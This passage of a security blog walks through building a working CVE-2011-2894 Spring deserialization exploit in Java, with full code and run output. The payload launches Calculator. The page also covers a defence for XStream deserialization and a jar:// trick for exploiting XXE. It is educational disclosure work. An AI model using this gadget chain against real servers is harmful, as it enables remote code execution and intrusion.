<pre><code class="language-lang-java line-numbers ">try {  
        Contact expl = (Contact) xstream.fromXML(payload);
} catch (com.thoughtworks.xstream.converters.ConversionException ex) {
    System.out.println("Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter");
}
</code></pre>

<p>And that's pretty much it, lets run the application again with our malicious payload:</p>

<pre><code class="language-lang-markup line-numbers ">&lt;contact&gt;  
  &lt;name&gt;Alvaro&lt;/name&gt;
&lt;/contact&gt;  
Trying to deserialize null object. Make sure the input is not null and that your custom converters have higher priority than the Catch-All converter  
</code></pre>

<p>Voila!! no calculator this time!</p>

<h2 id="furtherreading">Further reading</h2>

<ul>
<li>This vulnerability was presented by <a href="http://www.linkedin.com/pub/abraham-kang/0/953/384">Abraham Kang</a>, <a href="https://twitter.com/DinisCruz%E2%80%8E">Dinis Cruz</a> and yours truly during the  <a href="http://www.slideshare.net/DinisCruz/res-ting-on-your-laurels-will-get-you-powned4-3">"RESTing On Your Laurels will Get YOu Pwned"</a> DefCon 2013 talk</li>
<li>Dinis Cruz wrote a great <a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html">follow-up post</a> on his blog</li>
</ul>

<p>Thanks for reading!</p>
    </section>
</article>


<article class="post tag-java tag-exploit tag-cve-2011-2894 tag-spring">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-12-16">16 Dec 2013</time> on <a href="index.html">Java</a>, <a href="../exploit/">Exploit</a>, <a href="http://localhost:2368/tag/cve-2011-2894/">CVE-2011-2894</a>, <a href="http://localhost:2368/tag/spring/">Spring</a></span>
        <h2 class="post-title"><a href="http://localhost:2368/blog/2013/12/16/cve-2011-2894-deserialization-spring-rce/">CVE-2011-2894: Deserialization Spring RCE</a></h2>

    </header>
    <section class="post-content">
        <p>This post is about an old RCE vulnerability in applications deserializing streams from untrusted sources and having Spring on their classpaths. I wrote an exploit for it some time ago to learn about this kind of serializing vulnerabilities and decided to make it public since I recently read an study by <a href="http://www.whitesourcesoftware.com/">WhiteSource Software</a> saying that this vulneravility is in the top 5 vulnerabilities that are more prevalent due to a lack of Open Source component update.</p>

<p><img src="../../content/images/octopress/OpenSourceSecurityrisk-Nov13.jpg" alt=""></p>

<p>Note that to be vulnerable, you dont only need to have the vulnerable Spring libraries in your classpath, you need to be deserializing an stream from an untrusted source for example using RMI or Spring’s HttpInvoker.</p>

<p>Since I could not find any public exploit for it, I decided to go and write my very own one and learn something in the way. The <a href="http://support.springsource.com/security/cve-2011-2894">Spring announcement</a> doesnt give too many details, but fortunately <strong>Wouter Coekaerts</strong> (<a href="https://twitter.com/WouterCoekaerts">@WouterCoekaerts</a>) who deserves all the credit for finding this awesome bug , gave us more details on his <a href="http://wouter.coekaerts.be/2011/spring-vulnerabilities">own site</a>:</p>

<blockquote>
  <p>JdkDynamicAopProxy is used internally by the DefaultAopProxyFactory. It is an InvocationHandler , so it can be used with a java.lang.reflect.Proxy to dynamically handle method calls. Which object the proxy should delegate calls to, the target, can be configured in the JdkDynamicAopProxy with a TargetSource.
  Certain TargetSources can be configured to point to a bean in a BeanFactory, which can contain arbitrary code in the form of bean definitions.
  All of these objects (Proxy, JdkDynamicAopProxy, AbstractBeanFactoryBasedTargetSource, DefaultListableBeanFactory, AbstractBeanDefinition) are Serializable, and the Proxy can be configured to implement any interface the application might expect. That means an attacker can send them in the place of any object in a stream, and when the receiving application calls any method on the deserialized object, it will trigger the execution of the arbitrary code.
  A DefaultListableBeanFactory is under normal circumstances never included in a serialized stream. It has a writeReplace method that before it’s being serialized replaces it with a SerializedBeanFactoryReference; a reference to an already existing bean factory. But it’s only the serialization that is prevented (at the attacker’s side, where it’s easily overridden), not the deserialization.</p>
</blockquote>

<p>This somehow difficult to understand so lets analyze it while building our exploit:</p>

<p>First of all we need to understand what a <a href="http://docs.oracle.com/javase/6/docs/api/java/lang/reflect/Proxy.html">Dynamic Proxy</a> is. For the moment, it will be sufficient to say that a proxy can be defined for any Java interface so any calls to the interface can be intercepted and proxified by the proxy. An <a href="http://localhost:2368/tag/java/docs.oracle.com/javase/6/docs/api/java/lang/reflect/InvocationHandler.html">InvocationHandler</a> has to be configured for the proxy and it will handle all intercepted calls.</p>

<p>Spring's <a href="http://docs.spring.io/spring/docs/2.5.x/api/org/springframework/aop/framework/DefaultAopProxyFactory.html">DefaultAopProxyFactory</a> has a static method <strong>createAopProxy</strong> that returns an InvocationHandler with a given AOP configuration. This configuration is provided as an <a href="http://docs.spring.io/spring/docs/2.5.x/api/org/springframework/aop/framework/AdvisedSupport.html">AdvicedSupport</a> where we can basically choose if we want the factory to return a Dynamic or a CGLIB proxy and set the <a href="http://localhost:2368/tag/java/docs.spring.io/spring/docs/2.5.x/api/org/springframework/aop/TargetSource.html">TargetSource</a>. A <strong>TargetSource</strong> is used to obtain the current "target" of an AOP invocation, thats it, to point to who is going to really handle the interface method invocation.</p>

<p>We will be using a TargetSource configured with a BeanFactory, so any hooked calls will be handle by a brand new Bean returned by our bean factory. So far the code looks like:</p>

<pre><code class="language-lang-java line-numbers ">// AbstractBeanFactoryBasedTargetSource
System.out.println("[+] Creating a TargetSource for our handler, all hooked calls will be delivered to our malicious bean provided by our factory");  
SimpleBeanTargetSource targetSource = new SimpleBeanTargetSource();  
targetSource.setTargetBeanName("exploit");  
targetSource.setBeanFactory(beanFactory);

// JdkDynamicAopProxy (invocationhandler)
System.out.println("[+] Creating the handler and configuring the target source pointing to our malicious bean factory");  
AdvisedSupport config = new AdvisedSupport();  
config.addInterface(Contact.class); // So that the factory returns a JDK dynamic proxy  
config.setTargetSource(targetSource);  
DefaultAopProxyFactory handlerFactory = new DefaultAopProxyFactory();  
InvocationHandler handler = (InvocationHandler) handlerFactory.createAopProxy(config);

// Proxy
System.out.println("[+] Creating a Proxy implementing the server side expected interface (Contact) with our malicious handler");  
Contact proxy = (Contact) Proxy.newProxyInstance(Contact.class.getClassLoader(), new Class&lt;?&gt;[] { Contact.class }, handler);  
</code></pre>

<p><strong>beanFactory</strong> hasnt been created yet, so all we need to do now is creating a BeanFactory that returns "exploit" beans that when instantiated, will execute any arbitrary command.</p>

<p>First we will set up a bean created with a factory method (instead of using the constructor) that will return a java.lang.Runtime instance when the Factory instantiates the Bean.</p>

<pre><code class="language-lang-java line-numbers ">GenericBeanDefinition runtime = new GenericBeanDefinition();  
runtime.setBeanClass(Runtime.class);  
runtime.setFactoryMethodName("getRuntime"); // Factory Method needs to be static  
</code></pre>

<p>Now, we need to execute <strong>exec</strong> with our payload as an argument. We cannot use a FactoryMethod for that since it takes no arguments, so we will be using a <a href="http://docs.spring.io/spring/docs/1.2.x/api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html">MethodInvokingFactoryBean</a>. This FactoryBean will return a value which is the result of a static or instance method invocation. <br>
So the idea here is that we will define this FactoryBean as the bean handling our proxy invocations, so when the TargetSource needs a new bean to handle the hooked call it will instantiate our MethodInvokingFactory that will create the new bean by executing our payload. So in the end we will be returning a <strong>java.lang.UNIXProcess</strong> (returned by the Runtime execution) as the class to handle the proxy call. This will fail since the server will try to cast it to the class it was expecting and normally its not a process ;)</p>

<pre><code class="language-lang-java line-numbers ">// Exploit bean to be registered in the bean factory as the target source
GenericBeanDefinition payload = new GenericBeanDefinition();  
payload.setBeanClass(MethodInvokingFactoryBean.class);  
payload.setScope("prototype");  
payload.getPropertyValues().add("targetObject", runtime);  
payload.getPropertyValues().add("targetMethod", "exec");  
payload.getPropertyValues().add("arguments", Collections.singletonList("/Applications/Calculator.app/Contents/MacOS/Calculator"));  
</code></pre>

<p>Ok, so we only need to create a bean factory and register our <strong>payload</strong> bean as the "exploit" bean that our TargetSource is going to instantiate. The only problem is that although a DefaultListableBeanFactory is serializable, it contains a <strong>writeReplace()</strong> method that will replace the factory with a reference when serialized. If the server doesnt know the serialized reference, then our deserialization will fail. In order to bypass this limitiation, we will be modifying the <strong>DefaultListableBeanFactory</strong> bytecode using <strong>javaassist</strong> to remove the <strong>writeReplace()</strong> method (well, actually rename it):</p>

<pre><code class="language-lang-java line-numbers ">// Get a DefaultListableBeanFactory modified so it has no writeReplace() method
// We cannot load DefaultListableFactory till we are done modyfing it otherwise will get a "attempted duplicate class definition for name" exception
System.out.println("[+] Getting a DefaultListableBeanFactory modified so it has no writeReplace() method");  
Object instrumentedFactory = null;  
ClassPool pool = ClassPool.getDefault();  
try {  
    pool.appendClassPath(new javassist.LoaderClassPath(BeanDefinition.class.getClassLoader()));
    CtClass instrumentedClass = pool.get("org.springframework.beans.factory.support.DefaultListableBeanFactory");
    // Call setSerialVersionUID before modifying a class to maintain serialization compatability.
    SerialVersionUID.setSerialVersionUID(instrumentedClass);
    CtMethod method = instrumentedClass.getDeclaredMethod("writeReplace");
    //method.insertBefore("{ System.out.println(\"TESTING\"); }");
    method.setName("writeReplaceDisabled");
    Class instrumentedFactoryClass = instrumentedClass.toClass();
    instrumentedFactory = instrumentedFactoryClass.newInstance();
} catch (Exception e) {
    e.printStackTrace();
}

// Modified BeanFactory
DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) instrumentedFactory;  
beanFactory.registerBeanDefinition("exploit", payload);  
</code></pre>

<p>So far so good, now if we try to serialize the factory we will be getting errors since although a bean factory is Serializable, it contains members that are not serializable :$ <br>
Fortunately for us, these members can be nullified without affecting the bean generation. We will be using Java reflection to nullify them:</p>

<pre><code class="language-lang-java line-numbers ">// Preparing BeanFactory to be serialized
System.out.println("[+] Preparing BeanFactory to be serialized");  
System.out.println("[+] Nullifying non-serializable members");  
try {

    Field constructorArgumentValues = AbstractBeanDefinition.class.getDeclaredField("constructorArgumentValues");
    constructorArgumentValues.setAccessible(true);
    constructorArgumentValues.set(payload,null);
    System.out.println("[+] payload BeanDefinition constructorArgumentValues property should be null: " + payload.getConstructorArgumentValues());

    Field methodOverrides = AbstractBeanDefinition.class.getDeclaredField("methodOverrides");
    methodOverrides.setAccessible(true);
    methodOverrides.set(payload,null);
    System.out.println("[+] payload BeanDefinition methodOverrides property should be null: " + payload.getMethodOverrides());

    Field constructorArgumentValues2 = AbstractBeanDefinition.class.getDeclaredField("constructorArgumentValues");
    constructorArgumentValues2.setAccessible(true);
    constructorArgumentValues2.set(runtime,null);
    System.out.println("[+] runtime BeanDefinition constructorArgumentValues property should be null: " + runtime.getConstructorArgumentValues());

    Field methodOverrides2 = AbstractBeanDefinition.class.getDeclaredField("methodOverrides");
    methodOverrides2.setAccessible(true);
    methodOverrides2.set(runtime,null);
    System.out.println("[+] runtime BeanDefinition methodOverrides property should be null: " + runtime.getMethodOverrides());

    Field autowireCandidateResolver = DefaultListableBeanFactory.class.getDeclaredField("autowireCandidateResolver");
    autowireCandidateResolver.setAccessible(true);
    autowireCandidateResolver.set(beanFactory,null);
    System.out.println("[+] BeanFactory autowireCandidateResolver property should be null: " + beanFactory.getAutowireCandidateResolver());

} catch(Exception i) {
    i.printStackTrace();
    System.exit(-1);
}
</code></pre>

<p>Now, everything is ready to serialize our malicious proxy for a class that the victim server is expecting, in our example it will be the <strong>Contact</strong> class:</p>

<pre><code class="language-lang-java line-numbers ">// Now lets serialize the proxy
System.out.println("[+] Serializating malicious proxy");  
try {  
    FileOutputStream fileOut = new FileOutputStream("proxy.ser");
    ObjectOutputStream outStream = new ObjectOutputStream(fileOut);
    outStream.writeObject(proxy);
    outStream.close();
    fileOut.close();
} catch(IOException i) {
    i.printStackTrace();
}
System.out.println("[+] Successfully serialized: " + proxy.getClass().getName());  
</code></pre>

<p>Lets run the exploit to generate the serialized version of our malicious proxy:</p>

<pre><code class="language-lang-bash line-numbers ">[+] Getting a DefaultListableBeanFactory modified so it has no writeReplace() method
[+] Creating malicious bean definition programatically
[+] Preparing BeanFactory to be serialized
[+] Nullifying non-serializable members
[+] payload BeanDefinition constructorArgumentValues property should be null: null
[+] payload BeanDefinition methodOverrides property should be null: null
[+] runtime BeanDefinition constructorArgumentValues property should be null: null
[+] runtime BeanDefinition methodOverrides property should be null: null
[+] BeanFactory autowireCandidateResolver property should be null: null
[+] Creating a TargetSource for our handler, all hooked calls will be delivered to our malicious bean provided by our factory
[+] Creating the handler and configuring the target source pointing to our malicious bean factory
[+] Creating a Proxy implementing the server side expected interface (Contact) with our malicious handler
[+] Serializating malicious proxy
[+] Successfully serialized: com.sun.proxy.$Proxy0
</code></pre>

<p>To prove it works we will write a dumb server that deserialize our stream and cast it to the <strong>Contact</strong> class:</p>

<pre><code class="language-lang-java line-numbers ">package com.company;

import com.company.model.Contact;  
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.FileInputStream;

public class SerializationServer {

    public static void main (String[] args) {

        try {
            FileInputStream fileIn =new FileInputStream("proxy.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Contact contact = (Contact) in.readObject();
            System.out.println("[+] Running method in deserialized object");
            System.out.println("[+] Payload: " + contact.getName());
            in.close();
            fileIn.close();
           } catch(IOException i) {
            i.printStackTrace();
            System.exit(-1);
        } catch (ClassNotFoundException c) {
            System.out.println("Class not found");
            c.printStackTrace();
            System.exit(-1);
        }

    }
}
</code></pre>

<p>Lets run it:</p>

<pre><code class="language-lang-bash line-numbers ">[+] Running method in deserialized object
Exception in thread "main" org.springframework.aop.AopInvocationException: AOP configuration seems to be invalid: tried calling method [public abstract java.lang.String com.company.model.Contact.getName()] on target [java.lang.UNIXProcess@728f5352]; nested exception is java.lang.IllegalArgumentException: object is not an instance of declaring class  
    at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:317)
    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:196)
    at com.sun.proxy.$Proxy0.getName(Unknown Source)
    at com.company.SerializationServer.main(SerializationServer.java:17)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at com.intellij.rt.execution.application.AppMain.main(AppMain.java:120)
Caused by: java.lang.IllegalArgumentException: object is not an instance of declaring class  
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309)
    ... 8 more
</code></pre>

<p>As we were expecting the server crashed since our proxy returns a java.lang.UNIXProcess and the server was expecting a Contact, but it will be already too late since our malicious calcluator is running on the background:</p>

<p><img src="../../content/images/octopress/calc.png" alt=""></p>

<p>Voila!!</p>

<p>You can find the full exploit code in <a href="https://github.com/pwntester/SpringBreaker">github</a>.</p>
    </section>
</article>


<article class="post tag-xxe tag-java">
    <header class="post-header">
        <span class="post-meta"><time datetime="2013-11-28">28 Nov 2013</time> on <a href="../xxe/">XXE</a>, <a href="index.html">Java</a></span>
        <h2 class="post-title"><a href="../../blog/2013/11/28/abusing-jar-downloads/">Abusing jar:// downloads</a></h2>

    </header>
    <section class="post-content">
        <p>Recently I saw Timothy Morgan (<a href="https://twitter.com/ecbftw">@ecbftw</a>) presentation on OWASP AppSec USA'13 (<a href="http://www.youtube.com/watch?v=eHSNT8vWLfc&amp;feature=youtu.be">Video</a>) where he explained a clever trick to exploit a <strong>XXE</strong> or <strong>SSRF</strong> vulnerability fooling the server to fetch a file for us using the <strong>jar://</strong> protocol. The trick is to serve the file but keep the connection opened, so our file is effectively uploaded to the victim server and stored on a temporary location until we close the connection. The server needs to keep the temporary file till the connection is closed and he can try to unzip it to access the inner resource pointed in the <strong>jar://</strong> URL. As long as we keep the connection opened, we will be able to exploit the same XXE issue to locate the temporary file and use it to commit other attacks as the one explained in the video.</p>

<p>I decided to give the trick a try and implemented a simple Java blocking server that will serve our malicious payload and keep the connection open so we have time to use it for our attacking purposes. The blocking server can be found in my <a href="https://github.com/pwntester/BlockingServer">github repo</a>.</p>

<p>The trick works like a charm and in my case (OSX) the temporary file was stored on <strong>/var/folders/q0/tx9tt7p511qbxt26vl0wtxqr0000gn/T</strong> with the name pattern: <strong>jar_cachexxxxxxxxxxxxxxxx.tmp</strong>.</p>

<p>Have fun!</p>
    </section>
</article>


<nav class="pagination" role="navigation">
    <span class="page-number">Page 1 of 1</span>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

